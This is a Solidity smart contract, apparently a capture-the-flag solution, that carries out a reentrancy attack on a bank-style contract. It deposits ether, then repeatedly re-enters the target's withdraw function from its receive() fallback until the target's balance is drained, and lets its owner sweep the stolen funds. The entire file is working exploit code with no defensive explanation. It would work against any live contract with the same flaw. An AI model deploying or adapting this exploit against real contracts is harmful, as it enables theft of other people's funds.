// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

abstract contract IReentrance {
  mapping(address => uint256) public balances;

  function deposit() external payable virtual;

  function withdraw(uint256 _amount) external virtual;
}

// Introduce reentrancy attack
contract ReentranceAttack is Ownable {
  IReentrance public targetBank;
  uint256 initialDeposit;

  constructor(address challengeAddress) {
    targetBank = IReentrance(challengeAddress);
  }

  function withdraw() external onlyOwner {
    uint256 balance = address(this).balance;
    (bool result, ) = msg.sender.call{ value: balance }("");
    require(result, "Withdrawal failed.");
  }

  function attack() external payable {
    // Step 1: Deposit some funds
    initialDeposit = msg.value;
    targetBank.deposit{ value: initialDeposit }();

    // Step 2: withdraw these funds.
    callWithdraw();
  }

  receive() external payable {
    // Funds will be withdraw multiple times due to re-entrancy calls.
    callWithdraw();
  }

  function callWithdraw() private {
    // this balance correctly updates after withdraw
    uint256 remainingBalance = address(targetBank).balance;

    if (remainingBalance > initialDeposit) {
      targetBank.withdraw(initialDeposit);
    } else if (remainingBalance > 0) {
      targetBank.withdraw(remainingBalance);
    }
  }
}
